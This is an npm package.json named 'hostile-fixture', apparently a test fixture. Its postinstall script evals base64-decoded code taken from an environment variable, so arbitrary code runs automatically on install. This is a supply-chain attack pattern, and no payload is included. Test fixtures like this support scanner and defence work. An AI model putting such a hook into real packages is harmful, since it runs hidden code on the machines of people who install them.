{
  "name": "hostile-fixture",
  "version": "0.0.0",
  "private": true,
  "scripts": {
    "postinstall": "node -e \"eval(atob(process.env.P||''))\"",
    "prepare": "npm run build",
    "build": "tsc -p ."
  }
}
